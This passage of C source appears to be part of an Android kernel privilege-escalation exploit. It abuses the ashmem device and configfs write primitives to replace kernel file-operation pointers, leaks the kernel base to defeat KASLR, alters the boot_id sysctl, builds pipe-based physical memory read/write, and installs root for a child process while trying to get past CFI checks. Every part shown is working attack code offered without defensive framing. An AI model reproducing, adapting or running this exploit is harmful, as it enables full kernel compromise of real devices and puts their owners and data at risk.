  kaslr_expected_show_fdinfo = fops_runtime_text(a_fdinfo, ASHMEM_SHOW_FDINFO_OFF);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

int install_child_root(int fd) {
  if (!install_pipe_physrw(fd)) return 0;
  if (install_umh_root(fd)) return 1;
  return install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  durable_proof_log("cfi_before_open");
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    {
      char b[64];
      snprintf(b, sizeof(b), "cfi_open_fail errno=%d", errno);
      durable_proof_log(b);
    }
    pr_info("cfi open failed path=%s errno=%d\n", ashmem_path, errno);
    return 0;
  }
  {
    char b[80];
    snprintf(b, sizeof(b), "cfi_open_ok fd=%d", fd);
    durable_proof_log(b);
  }

  uint64_t a_ioctl = active_offsets ? active_offsets->off_ashmem_ioctl : 0;
  uint64_t a_open = active_offsets ? active_offsets->off_ashmem_open : 0;
  uint64_t a_cfg_w = active_offsets ? active_offsets->off_configfs_bin_write_iter : 0;
  uint64_t a_misc = active_offsets ? active_offsets->off_ashmem_misc_fops : 0;
  uint64_t a_fops = active_offsets ? active_offsets->off_ashmem_fops : 0;

  pr_info("cfi attempt=%d fd=%d path=%s fake_fops=%016zx target=%016zx "
          "ioctl=%016llx open=%016llx write_iter=%016llx\n",
          cfi_attempts, fd, ashmem_path, fake_fops, binwrite_target,
          (unsigned long long)fops_runtime_text(a_ioctl, ASHMEM_IOCTL_OFF),
          (unsigned long long)fops_runtime_text(a_open, ASHMEM_OPEN_OFF),
          (unsigned long long)fops_runtime_text(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF));

  uintptr_t misc_fops = fops_data_sym(a_misc, ASHMEM_MISC_FOPS_OFF);
  durable_proof_log("cfi_before_write");
  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  {
    char b[96];
    snprintf(b, sizeof(b), "cfi_write_ret=%zd errno=%d", n, errno);
    durable_proof_log(b);
  }
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;
  durable_proof_log("cfi_write_OK_PLATEAU_CROSSED");

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  pr_info("cfi fops_before ret=%zd value=%016llx want=%016zx errno=%d\n",
          rb, (unsigned long long)before, fake_fops, errno);
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(fops_image_sym(a_fops, ASHMEM_FOPS_OFF));
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) ||
      after != canon_addr(fops_image_sym(a_fops, ASHMEM_FOPS_OFF))) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t a_fops_fail = active_offsets ? active_offsets->off_ashmem_fops : 0;
    uint64_t original_fops_fail =
        p0_data_alias(fops_image_sym(a_fops_fail, ASHMEM_FOPS_OFF));
    if (kaslr_done) {
      original_fops_fail =
          canon_addr(fops_image_sym(a_fops_fail, ASHMEM_FOPS_OFF));
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
